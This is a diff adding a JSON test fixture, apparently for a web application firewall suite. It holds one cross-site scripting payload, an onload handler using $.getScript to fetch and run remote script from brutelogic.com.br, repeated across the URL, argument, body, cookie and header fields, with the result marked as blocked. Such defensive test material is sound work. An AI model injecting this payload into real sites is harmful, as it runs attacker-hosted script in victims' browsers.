@@ -1,0 +1,16 @@
+
+{
+  "payload": [
+    {
+      "URL": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+      "ARGS": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+      "BODY": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+      "COOKIE": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+      "USER-AGENT": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+      "REFERER": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+      "HEADER": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ]
+}
